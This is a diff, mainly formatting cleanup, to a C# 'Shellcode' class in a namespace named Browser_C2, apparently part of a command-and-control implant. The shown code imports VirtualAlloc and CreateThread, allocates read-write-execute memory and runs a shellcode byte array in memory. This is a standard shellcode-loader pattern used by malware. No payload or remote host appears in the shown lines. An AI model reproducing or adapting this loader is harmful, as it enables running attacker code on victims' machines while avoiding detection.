@@ -1,17 +1,11 @@
-﻿
-using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading;
+﻿using System;
 using System.Runtime.InteropServices;
-using System.IO;
+
 namespace Browser_C2
 {
-  public class Shellcode
+    public class Shellcode
     {
-
-       public  byte[] shellcode;
+        public byte[] shellcode;
 
         [Flags]
         public enum AllocationType : uint
@@ -48,7 +42,7 @@ namespace Browser_C2
         }
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
 
         [DllImport("kernel32.dll")]
         public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
@@ -59,11 +53,8 @@ namespace Browser_C2
         [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
         public delegate Int32 ExecuteDelegate();
 
-
         public void LoadShellcode()
         {
-
-
             IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(shellcode.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
             try
             {
@@ -74,15 +65,7 @@ namespace Browser_C2
             finally
             {
                 VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
-               
             }
         }
-
-
     }
-
-
 }
-
-
-
